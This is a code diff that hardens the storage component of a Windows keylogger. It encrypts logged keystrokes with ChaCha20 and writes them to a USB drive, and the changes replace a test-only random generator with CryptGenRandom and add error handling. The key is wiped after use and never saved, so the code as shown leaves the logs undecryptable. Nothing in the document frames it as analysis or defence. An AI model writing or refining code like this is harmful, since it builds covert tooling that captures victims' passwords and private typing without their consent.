@@ -4,6 +4,11 @@
 #include <string.h>
 #include <stdio.h>
 #include <time.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <wincrypt.h>
+
+#pragma comment(lib, "advapi32.lib")
 
 #define MAX_BUFFER_SIZE 4096
 #define FLUSH_INTERVAL 60
@@ -13,6 +18,8 @@ struct KeyLoggerStorage {
     size_t buffer_pos;
     time_t last_flush_time;
 };
+
+static bool generate_random_bytes(uint8_t* buffer, size_t length);
 
 KeyLoggerStorage* key_logger_storage_create(void) {
     KeyLoggerStorage* storage = safe_malloc(sizeof(KeyLoggerStorage));
@@ -78,18 +85,26 @@ bool key_logger_storage_encrypt_and_save_to_usb(KeyLoggerStorage* storage, const
 
     uint8_t key[CHACHA20_KEY_SIZE];
     uint8_t nonce[CHACHA20_NONCE_SIZE];
-    generate_random_bytes(key, CHACHA20_KEY_SIZE);
-    generate_random_bytes(nonce, CHACHA20_NONCE_SIZE);
+    
+    if (!generate_random_bytes(key, CHACHA20_KEY_SIZE) || 
+        !generate_random_bytes(nonce, CHACHA20_NONCE_SIZE)) {
+        return false;
+    }
 
     ChaCha20_ctx ctx;
     chacha20_init(&ctx, key, nonce);
     uint8_t* encrypted_buffer = safe_malloc(storage->buffer_pos);
-    if (!encrypted_buffer) return false;
+    if (!encrypted_buffer) {
+        return false;
+    }
 
     chacha20_encrypt(&ctx, (uint8_t*)storage->buffer, encrypted_buffer, storage->buffer_pos);
 
-    char filepath[256];
-    snprintf(filepath, sizeof(filepath), "%s/encrypted_keylogs_%lu.bin", usb_path, (unsigned long)time(NULL));
+    char filepath[MAX_PATH];
+    if (snprintf(filepath, sizeof(filepath), "%s\\encrypted_keylogs_%lu.bin", usb_path, (unsigned long)time(NULL)) < 0) {
+        safe_free(encrypted_buffer);
+        return false;
+    }
 
     FILE* file = fopen(filepath, "wb");
     if (!file) {
@@ -97,18 +112,35 @@ bool key_logger_storage_encrypt_and_save_to_usb(KeyLoggerStorage* storage, const
         return false;
     }
 
-    fwrite(nonce, 1, CHACHA20_NONCE_SIZE, file);
-    fwrite(encrypted_buffer, 1, storage->buffer_pos, file);
+    bool success = (fwrite(nonce, 1, CHACHA20_NONCE_SIZE, file) == CHACHA20_NONCE_SIZE) &&
+                   (fwrite(encrypted_buffer, 1, storage->buffer_pos, file) == storage->buffer_pos);
 
     fclose(file);
     safe_free(encrypted_buffer);
 
+    if (!success) {
+        return false;
+    }
+
+    memset(key, 0, CHACHA20_KEY_SIZE);
+
     return true;
 }
 
-static void generate_random_bytes(uint8_t* buffer, size_t length) {
-    // TEST USAGE
-    for (size_t i = 0; i < length; ++i) {
-        buffer[i] = rand() & 0xFF;
+static bool generate_random_bytes(uint8_t* buffer, size_t length) {
+    HCRYPTPROV hCryptProv;
+    bool result = false;
+
+    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+        return false;
     }
+
+    if (!CryptGenRandom(hCryptProv, (DWORD)length, buffer)) {
+        result = false;
+    } else {
+        result = true;
+    }
+
+    CryptReleaseContext(hCryptProv, 0);
+    return result;
 }
